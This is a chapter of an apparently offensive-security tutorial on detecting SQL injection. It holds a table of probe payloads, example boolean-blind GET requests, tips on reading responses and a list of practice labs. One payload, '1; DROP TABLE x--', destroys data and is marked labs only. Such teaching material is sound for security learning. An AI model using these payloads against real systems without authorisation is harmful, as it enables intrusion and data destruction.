# Chapter 04 — Detection & Basic Payloads

## About the Topic
Once you've identified candidate parameters (Chapter 03), you send small,
low-noise payloads to confirm the parameter is actually reaching a SQL
query — before committing to a full exploitation technique.

## Basic Detection Payloads

| Payload | Purpose |
|---|---|
| `'` | Single quote — causes a syntax error if injectable |
| `''` | Double single-quote — escape test |
| `1'` | Numeric field test |
| `1 AND 1=1` | Boolean true — should return normal result |
| `1 AND 1=2` | Boolean false — should return empty/different result |
| `1 OR 1=1` | OR true — may return all records |
| `'; --` | Comment out rest of query (MySQL/MSSQL) |
| `'; #` | Comment out rest (MySQL alternative) |
| `1; DROP TABLE x--` | Stacked query test (⚠️ destructive — labs only) |

## Practical Example
Testing a numeric ID parameter:

```
GET /product?id=1'
```
→ HTTP 500 / DB error → **strong signal of SQLi**.

```
GET /product?id=1 AND 1=1   → normal page
GET /product?id=1 AND 1=2   → empty/different page
```
→ Confirms **boolean-blind** injection even with no visible error.

## Reading the Signal
- **500 error / stack trace** → likely error-based SQLi, move to Ch. 07.
- **Page content changes with TRUE/FALSE** → boolean-blind, Ch. 08.
- **No visible difference at all** → try time-based, Ch. 09.
- **Extra rows/columns appear** → possible UNION injection, Ch. 06.

## Offensive Tips
- Always test **one payload at a time** and record the baseline response
  first — you need something to diff against.
- Use different quote styles (`'`, `"`, backtick) — the underlying DBMS
  determines which one matters (MySQL vs MSSQL vs PostgreSQL vs Oracle).
- Watch response **length and timing**, not just visible text — automated
  tools like sqlmap do this by default with `--technique` flags.

## Labs to Practice
- **PortSwigger Academy** — "Detecting SQL injection vulnerabilities" reading
  + first Apprentice lab.
- **TryHackMe** — *SQL Injection* room, detection payload tasks.
- **DVWA / bWAPP** — Low security level, to see raw error output.

## Key Takeaway
Detection is about generating a controlled, observable difference in the
application's behavior — that difference is your proof of concept.
